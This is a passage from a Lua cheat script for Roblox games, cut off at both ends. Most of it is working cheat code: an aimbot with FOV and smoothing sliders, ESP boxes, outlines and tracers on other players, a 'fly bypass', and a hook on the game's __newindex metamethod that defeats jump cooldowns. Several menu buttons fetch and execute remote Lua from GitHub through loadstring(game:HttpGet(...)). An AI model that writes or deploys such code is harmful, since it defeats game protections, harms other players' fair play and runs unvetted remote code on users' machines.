    PLAYER:GetMouse().KeyDown:Connect(function(KeyPressed) -- What The Fuck
        if KeyPressed == (DeleteMob.GUi.Keybind) and DeleteMob.GUi.KeybindEnable then
            if DeleteMobF.Visible == true then
                DeleteMobF.Visible = false
            else
                DeleteMobF.Visible = true
            end
        end
        if KeyPressed == (DeleteMob.Aimbot.Keybind) and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = true
        end
    end)
    PLAYER:GetMouse().KeyUp:Connect(function(KeyPressed) 
        if KeyPressed == (DeleteMob.Aimbot.Keybind) and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = false
        end
    end)
    
    PLAYER:GetMouse().Button1Down:Connect(function()
        if DeleteMob.Aimbot.Keybind == "MouseButton1" and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = true
        end
    end)
    PLAYER:GetMouse().Button1Up:Connect(function()
        if DeleteMob.Aimbot.Keybind == "MouseButton1" and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = false
        end
    end)
    PLAYER:GetMouse().Button2Down:Connect(function()
        if DeleteMob.Aimbot.Keybind == "MouseButton2" and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = true
        end
    end)
    PLAYER:GetMouse().Button2Up:Connect(function()
        if DeleteMob.Aimbot.Keybind == "MouseButton2" and DeleteMob.Aimbot.Enabled then
            DeleteMob.Aimbot.IsAimKeyDown = false
        end
    end)
    
    -- Made By Mick Gordon
    ABE.MouseButton1Click:Connect(function()
        if ABE.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            ABE.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.Aimbot.Enabled = true
        else
            ABE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.Aimbot.Enabled = false	
        end
    end)
    
    ABSF.MouseButton1Click:Connect(function()
        if ABSF.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            ABSF.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.Aimbot.ShowFov = true
        else
            ABSF.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.Aimbot.ShowFov = false	
        end
    end)
    
    ABTC.MouseButton1Click:Connect(function()
        if ABTC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            ABTC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.Aimbot.TeamCheck = true
        else
            ABTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.Aimbot.TeamCheck = false	
        end
    end)
    
    ABWC.MouseButton1Click:Connect(function()
        if ABWC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            ABWC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.Aimbot.WallCheck = true
        else
            ABWC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.Aimbot.WallCheck = false	
        end
    end)
    
    Allways_Show.MouseButton1Click:Connect(function()
        if DeleteMob.Aimbot.AimPart == "Head" then
            Allways_Show.Text = "head, TORSO"
            DeleteMob.Aimbot.AimPart = "HumanoidRootPart"
        else
            Allways_Show.Text = "HEAD, torso"
            DeleteMob.Aimbot.AimPart = "Head"
        end
    end)
    
    -- Box ESP
    
    BBD.MouseButton1Click:Connect(function()
        if BBD.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BBD.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.Distance = true
        else
            BBD.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.Distance = false	
        end
    end)
    
    BBE.MouseButton1Click:Connect(function()
        if BBE.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BBE.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.Box = true
        else
            BBE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.Box = false	
        end
    end)
    
    BBH.MouseButton1Click:Connect(function()
        if BBH.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BBH.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.Health = true
        else
            BBH.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.Health = false	
        end
    end)
    
    BBHT.MouseButton1Click:Connect(function()
        if DeleteMob.ESP.Box.HealthType == "Bar" then
            BBHT.Text = "bar, TEXT, both"
            DeleteMob.ESP.Box.HealthType = "Text"
        elseif DeleteMob.ESP.Box.HealthType == "Text" then
            BBHT.Text = "bar, text, BOTH"
            DeleteMob.ESP.Box.HealthType = "Both"
        elseif DeleteMob.ESP.Box.HealthType == "Both" then
            BBHT.Text = "BAR, text, both"
            DeleteMob.ESP.Box.HealthType = "Bar"
        end
    end)
    
    BBN.MouseButton1Click:Connect(function()
        if BBN.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BBN.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.Name = true
        else
            BBN.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.Name = false	
        end
    end)
    
    BTC.MouseButton1Click:Connect(function()
        if BTC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            BTC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Box.TeamCheck = true
        else
            BTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Box.TeamCheck = false	
        end
    end)
    -- Outlines
    
    OE.MouseButton1Click:Connect(function()
        if OE.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            OE.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.OutLines.Enabled = true
        else
            OE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.OutLines.Enabled = false	
        end
    end)
    
    OTC.MouseButton1Click:Connect(function()
        if OTC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            OTC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.OutLines.TeamCheck = true
        else
            OTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.OutLines.TeamCheck = false	
        end
    end)
    
    -- Tracers
    
    TE.MouseButton1Click:Connect(function()
        if TE.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            TE.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Tracers.Enabled = true
        else
            TE.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Tracers.Enabled = false	
        end
    end)
    
    TTC.MouseButton1Click:Connect(function()
        if TTC.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            TTC.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Tracers.TeamCheck = true
        else
            TTC.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Tracers.TeamCheck = false	
        end
    end)
    
    TTCOlor.MouseButton1Click:Connect(function()
        if TTCOlor.BackgroundColor3 == Color3.fromRGB(52, 52, 52) then
            TTCOlor.BackgroundColor3 = Color3.fromRGB(2, 54, 8)
            DeleteMob.ESP.Tracers.TeamColor = true
        else
            TTCOlor.BackgroundColor3 = Color3.fromRGB(52, 52, 52)
            DeleteMob.ESP.Tracers.TeamColor = false	
        end
    end)
    
    -- UI Toggle
    
    TextButton.MouseButton1Click:Connect(function()
        if DeleteMobF.Visible == true then
            DeleteMobF.Visible = false
        else
            DeleteMobF.Visible = true
        end
    end)
    
    
    -- Scripts:
    
    local function LDTZWMY_fake_script() -- Slider3.Script1 
        local Mouse = game.Players.LocalPlayer:GetMouse()
        local Slider = Slider3
        local Fill = Fill1
        local Trigger = TriggerFov
        local TextNumbers = Numbers
        
        local maxvalue = 7 or 700/700
        local startingvalue = 0 or 0/100
        
        Fill.Size = UDim2.fromScale(DeleteMob.Aimbot.Fov,1)
        TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Fov*100))
        
        local TweenService = game:GetService("TweenService")
        local TweenStyle =  TweenInfo.new(0.25, Enum.EasingStyle.Exponential)
        
        local function UpdateSlider()
            local OutPut = math.clamp(((Vector2.new(Mouse.X,Mouse.Y)-Slider.AbsolutePosition)/Slider.AbsoluteSize).X,0,1)
            
            if DeleteMob.Aimbot.Fov ~= OutPut then
                TweenService:Create(Fill,TweenStyle,{Size = UDim2.fromScale(OutPut,1)}):Play()
            end
            
            DeleteMob.Aimbot.Fov = (startingvalue +(OutPut*(maxvalue-startingvalue)))*100
            TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Fov*100))
        end
        
        Fill:GetPropertyChangedSignal("Size"):Connect(function()
            TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Fov*100))
        end)
        
        local SliderActive = false
        
        local function ActivateSlider()
            SliderActive = true
            while SliderActive do
                UpdateSlider()
                task.wait()
            end
        end
        
        Trigger.MouseButton1Down:Connect(ActivateSlider)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                SliderActive = false
            end
        end)
    end
    coroutine.wrap(LDTZWMY_fake_script)()
    
    local function YEOE_fake_script() -- Slider4.Script2 
        local Mouse = game.Players.LocalPlayer:GetMouse()
        local Slider = Slider4
        local Fill = Fill2
        local Trigger = TriggerSmoothing
        local TextNumbers = Numbers_2
        
        local maxvalue = 3 or 30/30
        local startingvalue = 0 or 0/100
        
        Fill.Size = UDim2.fromScale(DeleteMob.Aimbot.Smoothing,1)
        TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Smoothing*100))
        
        local TweenService = game:GetService("TweenService")
        local TweenStyle =  TweenInfo.new(0.25, Enum.EasingStyle.Exponential)
        
        local function UpdateSlider()
            local OutPut = math.clamp(((Vector2.new(Mouse.X,Mouse.Y)-Slider.AbsolutePosition)/Slider.AbsoluteSize).X,0,1)
            
            if DeleteMob.Aimbot.Smoothing ~= OutPut then
                TweenService:Create(Fill,TweenStyle,{Size = UDim2.fromScale(OutPut,1)}):Play()
            end
            
            DeleteMob.Aimbot.Smoothing = startingvalue +(OutPut*(maxvalue-startingvalue))
            TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Smoothing*100))
        end
        
        Fill:GetPropertyChangedSignal("Size"):Connect(function()
            TextNumbers.Text = tostring(math.round(DeleteMob.Aimbot.Smoothing*100))
        end)
        
        local SliderActive = false
        
        local function ActivateSlider()
            SliderActive = true
            while SliderActive do
                UpdateSlider()
                task.wait()
            end
        end
        
        Trigger.MouseButton1Down:Connect(ActivateSlider)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                SliderActive = false
            end
        end)
        
    end
    coroutine.wrap(YEOE_fake_script)()
    local function GOUU_fake_script() -- Slider1.Script3 
        local Mouse = game.Players.LocalPlayer:GetMouse()
        local Slider = Slider1
        local Fill = Fill3
        local Trigger = TriggerOutTans
        local TextNumbers = Numbers_3
        
        local maxvalue = 1 or 100/100
        local startingvalue = 0 or 0/100
        
        Fill.Size = UDim2.fromScale(DeleteMob.ESP.OutLines.OutlineTrancparency,1)
        TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.OutlineTrancparency*100))
        
        local TweenService = game:GetService("TweenService")
        local TweenStyle =  TweenInfo.new(0.25, Enum.EasingStyle.Exponential)
        
        local function UpdateSlider()
            local OutPut = math.clamp(((Vector2.new(Mouse.X,Mouse.Y)-Slider.AbsolutePosition)/Slider.AbsoluteSize).X,0,1)
            
            if DeleteMob.ESP.OutLines.OutlineTrancparency ~= OutPut then
                TweenService:Create(Fill,TweenStyle,{Size = UDim2.fromScale(OutPut,1)}):Play()
            end
            
            DeleteMob.ESP.OutLines.OutlineTrancparency = startingvalue +(OutPut*(maxvalue-startingvalue))
            TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.OutlineTrancparency*100))
        end
        
        Fill:GetPropertyChangedSignal("Size"):Connect(function()
            TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.OutlineTrancparency*100))
        end)
        
        local SliderActive = false
        
        local function ActivateSlider()
            SliderActive = true
            while SliderActive do
                UpdateSlider()
                task.wait()
            end
        end
        
        Trigger.MouseButton1Down:Connect(ActivateSlider)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                SliderActive = false
            end
        end)
        
    end
    coroutine.wrap(GOUU_fake_script)()
    local function MMUKLB_fake_script() -- Slider2.Script4 
        local Mouse = game.Players.LocalPlayer:GetMouse()
        local Slider = Slider2
        local Fill = Fill4
        local Trigger = TriggerFill
        local TextNumbers = Numbers_4
        
        local maxvalue = 1 or 100/100
        local startingvalue = 0 or 0/100
        
        Fill.Size = UDim2.fromScale(DeleteMob.ESP.OutLines.FillTrancparenct,1)
        TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.FillTrancparenct*100))
        
        local TweenService = game:GetService("TweenService")
        local TweenStyle =  TweenInfo.new(0.25, Enum.EasingStyle.Exponential)
        
        local function UpdateSlider()
            local OutPut = math.clamp(((Vector2.new(Mouse.X,Mouse.Y)-Slider.AbsolutePosition)/Slider.AbsoluteSize).X,0,1)
            
            if DeleteMob.ESP.OutLines.FillTrancparenct ~= OutPut then
                TweenService:Create(Fill,TweenStyle,{Size = UDim2.fromScale(OutPut,1)}):Play()
            end
            
            DeleteMob.ESP.OutLines.FillTrancparenct = startingvalue +(OutPut*(maxvalue-startingvalue))
            TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.FillTrancparenct*100))
        end
        
        Fill:GetPropertyChangedSignal("Size"):Connect(function()
            TextNumbers.Text = tostring(math.round(DeleteMob.ESP.OutLines.FillTrancparenct*100))
        end)
        
        local SliderActive = false
        
        local function ActivateSlider()
            SliderActive = true
            while SliderActive do
                UpdateSlider()
                task.wait()
            end
        end
        
        Trigger.MouseButton1Down:Connect(ActivateSlider)
        
        game:GetService("UserInputService").InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                SliderActive = false
            end
        end)
        
    end
    coroutine.wrap(MMUKLB_fake_script)()
    
    
    game:GetService('RunService').RenderStepped:connect(function()
    
        -- Aimbot Check
        if DeleteMob.Aimbot.IsAimKeyDown then
            local _pos = CameraGetClosestToMouse(DeleteMob.Aimbot.Fov)
            if _pos then
                aimAt(_pos, DeleteMob.Aimbot.Smoothing)
            end
        end
    
        -- Fov
        local acc = DeleteMob.Aimbot.Smoothing / 2	
        local posd = UIS:GetMouseLocation() 
        FOVFFrame.Position = UDim2.new(0, posd.X, 0, posd.Y - 36)
        FOVFFrame.Size = UDim2.new(0, DeleteMob.Aimbot.Fov + acc, 0, DeleteMob.Aimbot.Fov + acc)
        FOVFFrame.Visible = DeleteMob.Aimbot.ShowFov
        FOVFFrame.BackgroundColor3 = DeleteMob.Aimbot.FovFillColor
        FOVFFrame.Transparency = DeleteMob.Aimbot.FovFillTransparency
    
        UIStroke.Color = DeleteMob.Aimbot.FovFillColor
        UIStroke.Transparency = DeleteMob.Aimbot.FovTransparenct
        UIStroke.Thickness = DeleteMob.Aimbot.Thickness
        
        -- Colors 
        
        DeleteMob.ESP.Box.BoxColor = Color3.fromRGB(tonumber(Box_R.Text), tonumber(Box_G.Text), tonumber(Box_B.Text))
        DeleteMob.ESP.OutLines.FillCollor = Color3.fromRGB(tonumber(FillOutlines_R.Text), tonumber(FillOutlines_G.Text), tonumber(FillOutlines_B.Text))
        DeleteMob.ESP.OutLines.OutlineColor = Color3.fromRGB(tonumber(Outlines_R.Text), tonumber(Outlines_G.Text), tonumber(Outlines_B.Text))
        DeleteMob.ESP.Tracers.Color = Color3.fromRGB(tonumber(Tracers_R.Text), tonumber(Tracers_G.Text), tonumber(Tracers_B.Text))
    end)
    
    
    task.wait()
    
    for i,plr in pairs(game.Players:GetChildren()) do
        AddHighlight(plr)
        AddBox(plr)
        AddTracers(plr)
    end
    
    game.Players.PlayerAdded:Connect(function(plr)
        AddHighlight(plr)
        AddBox(plr)
        AddTracers(plr)
    end)
        end)
        
    
    Section:NewButton("GlideFly", "fly bypass", function()
        wait()
        togglekey = "b"  -- fly toggle
        upkey = "="      -- makes speed faster
        downkey = "-"    -- makes speed slower
        enablepart = "u" -- enables part fly
        speed = -0.5     -- changes set speed
        updown = false   -- true if you want to go up
        notify = true    -- true if you want notifcations
        flypart = true   -- true for part fly
        local user = game:GetService("UserInputService")
        local player = game:GetService("Players").LocalPlayer
        local GuiService = game:GetService("StarterGui")
        local mouse = game.Players.LocalPlayer:GetMouse()
        local holdingWKey = false
        local holdingSKey = false
        local holdingAKey = false
        local holdingDKey = false
        local holdingSpaceKey = false
        local holdingShiftKey = false
        local check = false
        GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Script made by Zurewrath";})
        mouse.KeyDown:connect(function(key)
           if key == enablepart then
               if flypart then
                   flypart = false
                   if notify then
                       GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Disabled part fly";})
                   end
               else
                   flypart = true
                   if notify then
                       GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Enabled part fly";})
                   end
               end
           end
        end)
        mouse.KeyDown:connect(function(key)
           if key == upkey then
               speed = speed + -0.1
               if notify then
                   GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Speed is now set to " .. speed;})
               end
           end
        end)
        mouse.KeyDown:connect(function(key)
           if key == downkey then
               speed = speed - -0.1
               if notify then
                   GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Speed is now set to " .. speed;})
               end
           end
        end)
        mouse.KeyDown:connect(function(key)
           if key == togglekey then
               if check  == true then
                   check = false
                   if notify then
                       GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Speed is now disabled";})
                   end
                   game.Workspace.fly:Destroy()
               else
                   check = true
                   if notify then
                       GuiService:SetCore("SendNotification", {Title = "Speed", Text = "Speed is now enabled";})
                   end
                   if flypart then
                       local brick = Instance.new("Part", workspace)
                       brick.Size = Vector3.new(8, 2, 8)
                       brick.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
                       brick.Transparency = 1 brick.Anchored = true brick.Name = "fly"
                       game:GetService('RunService').Stepped:connect(function()
                           brick.CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -4, 0)
                           brick.Size = Vector3.new(8+-speed, 2, 8+-speed)
                       end)
                   end
               end
           end
        end)
        game:GetService('RunService').Stepped:connect(function()
           if check then
               if holdingWKey == true then
                 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,speed)
               end
               if holdingSKey == true then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,0,-speed)
           end
               if holdingAKey == true then
           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(speed,0,0)
           end
               if holdingDKey == true then
           game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(-speed,0,0)
               end
               if holdingShiftKey == true then
                   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,speed,0)
               end
               if updown then
                   if holdingSpaceKey == true then
                       game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-speed,0)
                   end
               end
           end
        end)
        user.InputBegan:Connect(function(inputObject)
           if (inputObject.KeyCode == Enum.KeyCode.W) then
               holdingWKey = true
           end
           if (inputObject.KeyCode == Enum.KeyCode.S) then
               holdingSKey = true
           end
           if (inputObject.KeyCode == Enum.KeyCode.A) then
               holdingAKey = true
           end
           if (inputObject.KeyCode == Enum.KeyCode.D) then
               holdingDKey = true
           end
           if (inputObject.KeyCode == Enum.KeyCode.LeftControl) then
               holdingShiftKey = true
           end
           if (inputObject.KeyCode == Enum.KeyCode.Space) then
               holdingSpaceKey = true
           end
        end)
        user.InputEnded:Connect(function(inputObject)
           if (inputObject.KeyCode == Enum.KeyCode.W) then
               holdingWKey = false
           end
           if( inputObject.KeyCode == Enum.KeyCode.S) then
               holdingSKey = false
           end
           if (inputObject.KeyCode == Enum.KeyCode.A) then
               holdingAKey = false
           end
           if (inputObject.KeyCode == Enum.KeyCode.D) then
               holdingDKey = false
           end
           if (inputObject.KeyCode == Enum.KeyCode.LeftControl) then
               holdingShiftKey = false
           end
           if (inputObject.KeyCode == Enum.KeyCode.Space) then
               holdingSpaceKey = false
           end
        end)
        end)
    
        Section:NewButton("NoJumpCooldown", "by meetly", function()
            wait()
    -- // Services
    local Players = game:GetService("Players")
    
    -- // Vars
    local LocalPlayer = Players.LocalPlayer
    
    -- // Hooking __newindex
    local __newindex
    __newindex = hookmetamethod(game, "__newindex", function(t, k, v)
        -- // See if the game is trying to make it so we cannot jump :(
        if (t:IsDescendantOf(LocalPlayer.Character) and k == "Jump" and v == false) then
            -- // bad game
            return
        end
    
        -- // So we do not mess with anything else
        return __newindex(t, k, v)
    end)
            end)
    
            Section:NewButton("Universal ESP", "ESP", function()
                wait()
                loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
                end)
                
            
            local Setting = Window:NewTab("Setting")
    local SettingSection = Setting:NewSection("Setting")
    
    SettingSection:NewKeybind("Toggle UI", "Close/Open UI", Enum.KeyCode.BackSlash, function()
        Library:ToggleUI()
    end)
    end)

local Tab = Window:NewTab("Visual/Render")
 
 local Section = Tab:NewSection("Visual Hack to Player")

 Section:NewButton("KeyStrokes", "-", function()
wait()
getgenv().k1 = "W"
getgenv().k2 = "A"
getgenv().k3 =  "S"
getgenv().k4 = "D"

getgenv().backdrop = false -- only if you want the shadow bg.
getgenv().showms = true -- only if you want to have your ms shown.
getgenv().showfps = true -- only if you want to have your fps shown.
getgenv().showkps = true -- only if you want to have your kps shown.
getgenv().animated = true -- only if you want the GUI to have the animated shadow.
getgenv().showarrows = false -- only if you want arrow keys to be shown.
getgenv().keydrag = false -- only if you want the keys to be draggable, can also be buggy, will be worked on in the future.

loadstring(game:HttpGet("https://raw.githubusercontent.com/Zirmith/Util-Tools/main/keyStrokes.lua"))()

end)
 
Section:NewButton("FB (fullbright)", "fullbright", function()
wait()
pcall(function()
    local lighting = game:GetService("Lighting");
    lighting.Ambient = Color3.fromRGB(255, 255, 255);
    lighting.Brightness = 1;
    lighting.FogEnd = 1e10;
    for i, v in pairs(lighting:GetDescendants()) do
        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") then
            v.Enabled = false;
        end;
    end;
    lighting.Changed:Connect(function()
        lighting.Ambient = Color3.fromRGB(255, 255, 255);
        lighting.Brightness = 1;
        lighting.FogEnd = 1e10;
    end);
    spawn(function()
        local character = game:GetService("Players").LocalPlayer.Character;
        while wait() do
            repeat wait() until character ~= nil;
            if not character.HumanoidRootPart:FindFirstChildWhichIsA("PointLight") then
                local headlight = Instance.new("PointLight", character.HumanoidRootPart);
                headlight.Brightness = 1;
                headlight.Range = 60;
            end;
        end;
    end);
end)
end)

Section:NewButton("free-cam", "toggel shift + p", function()
wait()
-----------------------------------------------------------------------
-- Freecam
-- Cinematic free camera for spectating and video production.
-- Shift+P to toggle freecam
-- Q and E to go up and down
-- Have fun!
------------------------------------------------------------------------

function sandbox(var,func)
local env = getfenv(func)
local newenv = setmetatable({},{
__index = function(self,k)
if k=="script" then
return var
else
return env[k]
end
end,
})
setfenv(func,newenv)
return func
end
cors = {}
mas = Instance.new("Model",game:GetService("Lighting"))
LocalScript0 = Instance.new("LocalScript")
LocalScript0.Name = "FreeCamera"
LocalScript0.Parent = mas
table.insert(cors,sandbox(LocalScript0,function()

local pi    = math.pi
local abs   = math.abs
local clamp = math.clamp
local exp   = math.exp
local rad   = math.rad
local sign  = math.sign
local sqrt  = math.sqrt
local tan   = math.tan

local ContextActionService = game:GetService("ContextActionService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
if not LocalPlayer then
Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
LocalPlayer = Players.LocalPlayer
end

local Camera = workspace.CurrentCamera
workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
local newCamera = workspace.CurrentCamera
if newCamera then
Camera = newCamera
end
end)

------------------------------------------------------------------------

local TOGGLE_INPUT_PRIORITY = Enum.ContextActionPriority.Low.Value
local INPUT_PRIORITY = Enum.ContextActionPriority.High.Value
local FREECAM_MACRO_KB = {Enum.KeyCode.LeftShift, Enum.KeyCode.P}

local NAV_GAIN = Vector3.new(1, 1, 1)*64
local PAN_GAIN = Vector2.new(0.75, 1)*8
local FOV_GAIN = 300

local PITCH_LIMIT = rad(90)

local VEL_STIFFNESS = 1.5
local PAN_STIFFNESS = 1.0
local FOV_STIFFNESS = 4.0

------------------------------------------------------------------------

local Spring = {} do
Spring.__index = Spring

function Spring.new(freq, pos)
local self = setmetatable({}, Spring)
self.f = freq
self.p = pos
self.v = pos*0
return self
end

function Spring:Update(dt, goal)
local f = self.f*2*pi
local p0 = self.p
local v0 = self.v

local offset = goal - p0
local decay = exp(-f*dt)

local p1 = goal + (v0*dt - offset*(f*dt + 1))*decay
local v1 = (f*dt*(offset*f - v0) + v0)*decay

self.p = p1
self.v = v1

return p1
end

function Spring:Reset(pos)
self.p = pos
self.v = pos*0
end
end

------------------------------------------------------------------------

local cameraPos = Vector3.new()
local cameraRot = Vector2.new()
local cameraFov = 0

local velSpring = Spring.new(VEL_STIFFNESS, Vector3.new())
local panSpring = Spring.new(PAN_STIFFNESS, Vector2.new())
local fovSpring = Spring.new(FOV_STIFFNESS, 0)

------------------------------------------------------------------------

local Input = {} do
local thumbstickCurve do
local K_CURVATURE = 2.0
local K_DEADZONE = 0.15

local function fCurve(x)
return (exp(K_CURVATURE*x) - 1)/(exp(K_CURVATURE) - 1)
end

local function fDeadzone(x)
return fCurve((x - K_DEADZONE)/(1 - K_DEADZONE))
end

function thumbstickCurve(x)
return sign(x)*clamp(fDeadzone(abs(x)), 0, 1)
end
end

local gamepad = {
ButtonX = 0,
ButtonY = 0,
DPadDown = 0,
DPadUp = 0,
ButtonL2 = 0,
ButtonR2 = 0,
Thumbstick1 = Vector2.new(),
Thumbstick2 = Vector2.new(),
}

local keyboard = {
W = 0,
A = 0,
S = 0,
D = 0,
E = 0,
Q = 0,
U = 0,
H = 0,
J = 0,
K = 0,
I = 0,
Y = 0,
Up = 0,
Down = 0,
LeftShift = 0,
RightShift = 0,
}

local mouse = {
Delta = Vector2.new(),
MouseWheel = 0,
}

local NAV_GAMEPAD_SPEED  = Vector3.new(1, 1, 1)
local NAV_KEYBOARD_SPEED = Vector3.new(1, 1, 1)
local PAN_MOUSE_SPEED    = Vector2.new(1, 1)*(pi/64)
local PAN_GAMEPAD_SPEED  = Vector2.new(1, 1)*(pi/8)
local FOV_WHEEL_SPEED    = 1.0
local FOV_GAMEPAD_SPEED  = 0.25
local NAV_ADJ_SPEED      = 0.75
local NAV_SHIFT_MUL      = 0.25

local navSpeed = 1

function Input.Vel(dt)
navSpeed = clamp(navSpeed + dt*(keyboard.Up - keyboard.Down)*NAV_ADJ_SPEED, 0.01, 4)

local kGamepad = Vector3.new(
thumbstickCurve(gamepad.Thumbstick1.x),
thumbstickCurve(gamepad.ButtonR2) - thumbstickCurve(gamepad.ButtonL2),
thumbstickCurve(-gamepad.Thumbstick1.y)
)*NAV_GAMEPAD_SPEED

local kKeyboard = Vector3.new(
keyboard.D - keyboard.A + keyboard.K - keyboard.H,
keyboard.E - keyboard.Q + keyboard.I - keyboard.Y,
keyboard.S - keyboard.W + keyboard.J - keyboard.U
)*NAV_KEYBOARD_SPEED

local shift = UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) or UserInputService:IsKeyDown(Enum.KeyCode.RightShift)

return (kGamepad + kKeyboard)*(navSpeed*(shift and NAV_SHIFT_MUL or 1))
end

function Input.Pan(dt)
local kGamepad = Vector2.new(
thumbstickCurve(gamepad.Thumbstick2.y),
thumbstickCurve(-gamepad.Thumbstick2.x)
)*PAN_GAMEPAD_SPEED
local kMouse = mouse.Delta*PAN_MOUSE_SPEED
mouse.Delta = Vector2.new()
return kGamepad + kMouse
end

function Input.Fov(dt)
local kGamepad = (gamepad.ButtonX - gamepad.ButtonY)*FOV_GAMEPAD_SPEED
local kMouse = mouse.MouseWheel*FOV_WHEEL_SPEED
mouse.MouseWheel = 0
return kGamepad + kMouse
end

do
local function Keypress(action, state, input)
keyboard[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
return Enum.ContextActionResult.Sink
end

local function GpButton(action, state, input)
gamepad[input.KeyCode.Name] = state == Enum.UserInputState.Begin and 1 or 0
return Enum.ContextActionResult.Sink
end

local function MousePan(action, state, input)
local delta = input.Delta
